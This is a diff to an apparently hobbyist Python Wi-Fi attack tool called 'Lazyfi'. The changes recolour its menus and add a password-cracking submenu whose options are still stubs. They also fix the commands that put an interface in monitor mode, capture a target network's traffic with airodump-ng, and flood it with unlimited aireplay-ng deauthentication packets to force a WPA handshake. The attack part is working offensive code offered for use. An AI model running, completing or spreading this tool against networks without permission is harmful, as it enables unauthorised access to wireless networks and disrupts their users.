@@ -75,20 +75,20 @@ def install_script():
 #banner
 def banner():
     os.system("clear")
-    print(colored("**********************************","blue"))
-    print(colored("*   _                     __ _   *","blue"))
-    print(colored("*  | |    __ _ _____   _ / _(_)  *","blue"))
-    print(colored("*  | |   / _` |_  / | | | |_| |  *","blue"))
-    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","blue"))
-    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","blue"))
-    print(colored("*                  |___/         *","blue"))
-    print(colored("*                        v 2.0   *","blue"))
-    print(colored("**********************************","blue"))
-    print(colored("*[1] Automatic Mode              *","blue"))
-    print(colored("*[2] Manual Mode                 *","blue"))
-    print(colored("*[3] Clear                       *","blue"))
-    print(colored("*[4] Exit                        *","blue"))
-    print(colored("**********************************","blue"))
+    print(colored("**********************************","yellow"))
+    print(colored("*   _                     __ _   *","yellow"))
+    print(colored("*  | |    __ _ _____   _ / _(_)  *","yellow"))
+    print(colored("*  | |   / _` |_  / | | | |_| |  *","yellow"))
+    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","yellow"))
+    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","yellow"))
+    print(colored("*                  |___/         *","yellow"))
+    print(colored("*                        v 2.0   *","yellow"))
+    print(colored("**********************************","yellow"))
+    print(colored("*[1] Automatic Mode              *","yellow"))
+    print(colored("*[2] Manual Mode                 *","yellow"))
+    print(colored("*[3] Clear                       *","yellow"))
+    print(colored("*[4] Exit                        *","yellow"))
+    print(colored("**********************************","yellow"))
     response = input(colored("Lazy: ","blue"))
     if response == '1':
         check_interface()
@@ -348,23 +348,23 @@ def clear():
 #####################
 def manual():
     os.system("clear")
-    print(colored("**********************************","blue"))
-    print(colored("*   _                     __ _   *","blue"))
-    print(colored("*  | |    __ _ _____   _ / _(_)  *","blue"))
-    print(colored("*  | |   / _` |_  / | | | |_| |  *","blue"))
-    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","blue"))
-    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","blue"))
-    print(colored("*                  |___/         *","blue"))
-    print(colored("*                        v 2.0   *","blue"))
-    print(colored("**********************************","blue"))
-    print(colored("*[1] Enable Monitor Mode         *","blue"))
-    print(colored("*[2] Search For Networks         *","blue"))
-    print(colored("*[3] Select Network To Hack      *","blue"))
-    print(colored("*[4] Crack Password              *","blue"))
-    print(colored("*[5] Restore Network Services    *","blue"))
-    print(colored("*[6] Go Back                     *","blue"))
-    print(colored("*[7] Exit                        *","blue"))
-    print(colored("**********************************","blue"))
+    print(colored("**********************************","yellow"))
+    print(colored("*   _                     __ _   *","yellow"))
+    print(colored("*  | |    __ _ _____   _ / _(_)  *","yellow"))
+    print(colored("*  | |   / _` |_  / | | | |_| |  *","yellow"))
+    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","yellow"))
+    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","yellow"))
+    print(colored("*                  |___/         *","yellow"))
+    print(colored("*                        v 2.0   *","yellow"))
+    print(colored("**********************************","yellow"))
+    print(colored("*[1] Enable Monitor Mode         *","yellow"))
+    print(colored("*[2] Search For Networks         *","yellow"))
+    print(colored("*[3] Select Network To Hack      *","yellow"))
+    print(colored("*[4] Crack Password              *","yellow"))
+    print(colored("*[5] Restore Network Services    *","yellow"))
+    print(colored("*[6] Go Back                     *","yellow"))
+    print(colored("*[7] Exit                        *","yellow"))
+    print(colored("**********************************","yellow"))
     response = input(colored("Lazy: ","blue"))
     if response == '1':
         enb_mon()
@@ -373,7 +373,7 @@ def manual():
     elif response == '3':
         get_hand()
     elif response == '4':
-        pass
+        password()
     elif response == '5':
         restore()
     elif response == '6':
@@ -381,6 +381,10 @@ def manual():
     elif response == '7':
         os.system("clear")
         quit()
+    else:
+        print(colored("Choose A Number From The Menu...","red"))
+        time.sleep(2)
+        manual()
 
 #enables monitor for network detection
 def enb_mon():
@@ -435,9 +439,9 @@ def search_net():
     time.sleep(2)
     print(colored("Press ctrl + c To Stop The Process...","blue"))
     time.sleep(2)
-    os.system("xterm -hold -bg black -fg brown -e 'airodump-ng --write nearby {}'".format(inte))
-    print(colored("Wifi List Will Be Available In Handshake Section....","green"))
-    time.sleep(2)
+    os.system("xterm  -bg black -fg brown -e 'airodump-ng --write nearby {}'".format(inte))
+    print(colored("Wifi List Will Be Available In Select Network To Hack Section....","green"))
+    input(colored("Press Enter To Continue...","green"))
     manual()
 
 #select a network to hack
@@ -465,9 +469,11 @@ def get_essid():
     printa()
 
 def printa():
+    os.system("clear")
     global bssidm
     global channelm
     global essidm
+    global topri
     i = 0
     print(colored("Select One Network To Start Hack","yellow"))
     print("")
@@ -488,6 +494,9 @@ def printa():
     print(colored("CHANNEl : {}","green").format(str(channelm[topri].text)))
     print("")
     input(colored("Press Enter To Start Hack","green"))
+    os.system("rm *.cap")
+    os.system("rm *.csv")
+    os.system("rm *.netxml")
     hack_manual()
 
 def hack_manual():
@@ -496,21 +505,23 @@ def hack_manual():
     Thread(target = sta_airp).start()
 
 def sta_aird():
+    global topri
     interface = netifaces.interfaces()                                                                                                                                         
     inte = interface[2] 
     global bssidm                                                                                                                                                                  
     global channelm                                                                                                                                                                        
     global essidm                                                                                                                                                            
     print(colored("Wait For Handshake Then Close Both The Window","yellow"))                                                                                                           
-    time.sleep(2)                                                                                                                                                                     
-    os.system("xterm -bg black -fg brown -e 'airodump-ng --bssid {} --channel {} --write {} {}'".format(bssidm,channelm,essidm,inte))
+    time.sleep(2)                                                                                                                                                                
+    os.system("xterm -bg black -fg brown -e 'airodump-ng --bssid {} --channel {} --write {} {}'".format(bssidm[topri].text,channelm[topri].text,essidm[topri].text,inte))
     manual()
 
 def sta_airp():
     global bssidm 
+    global topri
     interface = netifaces.interfaces()                                                                                                                                         
     inte = interface[2]                                                                                                                                                                                                                                                                                                                
-    os.system("xterm -bg black -fg brown -e 'aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'".format(bssidm,inte))       
+    os.system("xterm -bg black -fg brown -e 'aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'".format(bssidm[topri].text,inte))       
 
 def restore():
     print(colored("Changing Interface Back To wlan0","yellow"))
@@ -541,5 +552,43 @@ def restore():
         time.sleep(2)
         os.system("service dhclient restart") 
     manual()   
+
+#######################
+#####PASSWORD CRACK####
+#######################
+def password():
+    os.system("clear")
+    print(colored("**********************************","yellow"))
+    print(colored("*   _                     __ _   *","yellow"))
+    print(colored("*  | |    __ _ _____   _ / _(_)  *","yellow"))
+    print(colored("*  | |   / _` |_  / | | | |_| |  *","yellow"))
+    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","yellow"))
+    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","yellow"))
+    print(colored("*                  |___/         *","yellow"))
+    print(colored("*                        v 2.0   *","yellow"))
+    print(colored("**********************************","yellow"))
+    print(colored("*[1] Use Wordlist                *","yellow"))
+    print(colored("*[2] Use Crunch                  *","yellow"))
+    print(colored("*[3] Go Back                     *","yellow"))
+    print(colored("*[4] Exit                        *","yellow"))
+    print(colored("**********************************","yellow"))
+    response = input(colored("Lazy: ","blue"))
+    if response == '1':
+        pass
+    elif response == '2':
+        pass
+    elif response == '3':
+        manual()
+    elif response == '4':
+        os.system("clear")
+        quit()
+    else:
+        print(colored("Choose A Number From The Menu...","red"))
+        time.sleep(2)
+        password()
+
+
+
+
 #call functions
 check_root()
